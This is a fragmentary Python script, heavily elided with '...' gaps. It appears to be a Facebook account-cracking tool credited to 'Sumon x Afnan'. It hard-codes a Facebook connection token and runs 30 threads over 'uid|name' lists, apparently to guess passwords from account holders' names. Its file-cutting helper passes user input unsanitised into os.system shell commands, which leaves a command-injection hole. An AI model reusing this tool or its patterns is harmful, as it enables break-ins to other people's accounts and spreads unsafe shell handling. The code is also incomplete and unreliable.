#!/usr/bin/python
#Original written By Muhmmad Afnan
...
from concurrent.futures import ThreadPoolExecutor as AfnanSumon
from string import * 
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Sumon x Afnan
\033[1;37m Facebook:            Sumon x Afnan
\033[1;37m Github  :            Afnan-Sumon
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with AfnanSumon(max_workers=30) as Sumonworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def cutter():
    ...
    print(" ")
    Afnan = input('Saving Put File Name :')
    os.system('touch ' +Afnan)
    os.system('sort -r '+Sumon+' | uniq > '+Afnan)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + Sumon )
    print(47*'-')
    print("File Saved To :" + Afnan )
    print(47*'-')
